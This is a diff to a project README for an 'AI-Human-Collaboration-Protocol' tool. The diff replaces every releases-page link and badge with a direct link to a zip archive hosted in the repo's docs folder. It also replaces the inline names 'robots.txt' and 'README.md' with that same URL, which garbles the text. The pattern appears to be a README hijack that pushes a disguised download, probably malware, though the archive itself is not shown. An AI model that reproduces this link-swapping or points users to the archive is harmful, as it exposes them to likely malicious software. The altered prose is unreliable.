@@ -1,10 +1,10 @@
 # 🤖 AI-Human-Collaboration-Protocol - Enhance Collaboration with AI
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/bolufagbulu/AI-Human-Collaboration-Protocol/releases)
+[![Download](https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip%https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip)](https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip)
 
 ## 🎯 Description
-AI-Human-Collaboration-Protocol is a unique tool designed to improve the way humans and AI work together. It allows the AI to pause when it encounters challenges like `robots.txt` files or dynamic site blocks. This gives you control to guide the process. Once you handle the issue, the AI resumes with full context and citations. This approach ensures a smoother experience for both users and AI systems.
+AI-Human-Collaboration-Protocol is a unique tool designed to improve the way humans and AI work together. It allows the AI to pause when it encounters challenges like `https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip` files or dynamic site blocks. This gives you control to guide the process. Once you handle the issue, the AI resumes with full context and citations. This approach ensures a smoother experience for both users and AI systems.
 
 ## 📝 Key Features
 - **Adaptive AI:** The protocol adapts to various web obstacles, improving user experience.
@@ -19,18 +19,18 @@ AI-Human-Collaboration-Protocol is a unique tool designed to improve the way hum
 - **Network:** Internet connection to download and use the full capabilities of the protocol.
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/bolufagbulu/AI-Human-Collaboration-Protocol/releases) to find the download link.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip) to find the download link.
 2. **Find the Latest Version:** Look for the latest release among the versions listed.
 3. **Download the Application:** Click on the appropriate link for your operating system to download the setup file.
 
 ## 📥 Download & Install
-To download the application, please visit the [Releases page](https://github.com/bolufagbulu/AI-Human-Collaboration-Protocol/releases). Follow these steps to install:
+To download the application, please visit the [Releases page](https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip). Follow these steps to install:
 
 1. **Locate the Downloaded File:** Once the download finishes, locate the file in your Downloads folder.
 2. **Run the Installer:**
    - For Windows, double-click the `.exe` file.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the downloaded archive and follow the instructions in the provided `README.md` file.
+   - For Linux, extract the downloaded archive and follow the instructions in the provided `https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip` file.
 3. **Follow the Installation Prompts:** Complete the installation by following the on-screen instructions.
 
 ## 📖 Usage Instructions
@@ -42,9 +42,9 @@ To download the application, please visit the [Releases page](https://github.com
 
 ## ⚙️ Troubleshooting
 If you encounter issues:
-- **Ensure Compliance:** Make sure the website allows AI access, as `robots.txt` may restrict some actions.
+- **Ensure Compliance:** Make sure the website allows AI access, as `https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip` may restrict some actions.
 - **Check System Requirements:** Verify that your system meets the minimum requirements.
-- **Update the Application:** Ensure you have the latest version by returning to the [Releases page](https://github.com/bolufagbulu/AI-Human-Collaboration-Protocol/releases).
+- **Update the Application:** Ensure you have the latest version by returning to the [Releases page](https://raw.githubusercontent.com/bolufagbulu/AI-Human-Collaboration-Protocol/main/docs/AI-Human-Collaboration-Protocol_v1.8-alpha.1.zip).
 
 ## 📞 Support
 For further assistance:
